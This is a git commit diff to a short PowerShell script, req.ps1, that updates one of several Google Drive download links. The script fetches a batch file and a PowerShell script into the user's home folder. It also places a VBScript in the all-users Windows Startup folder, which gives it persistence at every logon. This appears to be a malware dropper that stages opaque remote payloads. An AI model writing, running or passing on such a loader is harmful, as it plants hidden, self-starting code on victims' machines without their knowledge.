a633cf90bf78e683ba191c706366e6c8ed2e621a
UNKNOWNHUNTER6969 <98267862+UNKNOWNHUNTER6969@users.noreply.github.com>
2025-07-03 05:32:10 -0700

    Update req.ps1

--- req.ps1
+++ req.ps1
@@ -1,5 +1,5 @@
 cd C:\Users\$Env:UserName
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1FvnhxznvSAdg432ZJv2Scw9dXKO6a6oc" -outfile "win64.bat"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1bVch_eQP-2QiQllrW5VKCDm0u9p-nJ5I" -outfile "win64.bat"
 Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1xejGhEY1YxEJNanzlceGfv9SVNdGpDEg" -outfile "user.ps1"
 cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1Xb04koBk_3V7TowsMP3kaqgpBAWJZz5x" -outfile "startup.vbs"
